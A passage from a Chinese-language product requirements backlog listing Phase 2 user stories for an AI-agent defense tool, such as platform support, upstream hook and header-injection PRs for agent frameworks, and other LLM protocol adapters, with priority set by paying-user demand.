| US-P2-11 | ~~多 agent 适配（OpenClaw / Hermes / 自写 agent）~~ | 已升入 Phase 1 v1.5（US-18/19/20） |
| US-P2-12 | Linux / Windows GUI App | §6.6 Phase 1 仅 macOS，其余推 Phase 2 |
| US-P2-13 | 给 OpenClaw 提 PR 实现 pre_skill_invoke hook 等价物 | 升级 OpenClaw 双层防御，UX 与 Claude Code 对齐 |
| US-P2-14 | 给 Hermes 提 PR 加原生 X-Sieve-Origin header 注入支持 | 当前 Phase 1 走外挂注入，原生支持 UX 更优 |
| US-P2-15 | Gemini / Mistral / Cohere 等其他 LLM 协议适配 | 真有第二个用户主动要再做，Phase 2 待定 |


> **触发条件**：上述故事的优先级排序由"真实用户付费请求"决定，非 doskey 个人想象——参见 PRD v1.5 §9 第 9 条。